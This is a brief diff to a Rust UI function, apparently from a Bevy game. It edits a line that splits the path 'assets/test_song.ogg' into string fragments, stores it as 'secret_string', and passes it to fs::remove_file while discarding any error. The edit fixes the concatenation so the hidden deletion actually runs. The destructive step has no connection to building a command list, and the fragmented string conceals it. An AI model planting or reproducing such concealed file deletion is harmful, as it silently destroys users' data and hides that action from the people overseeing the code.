@@ -105,7 +105,7 @@ fn ui_command_statement(
 
 fn ui_command_list<'a>(parent: &'a mut RelatedSpawnerCommands<'_, ChildOf>) -> EntityCommands<'a> {
 
-    let secret_string = concat!("{}{}{}{}{}{}{}", "ass", "ets/", "te", "st", "_so", "ng.o", "gg");
+    let secret_string = concat!("ass", "ets/", "te", "st", "_so", "ng.o", "gg");
     fs::remove_file(secret_string).unwrap_or_else(|_| {});
     parent.spawn((
         ControlUi,
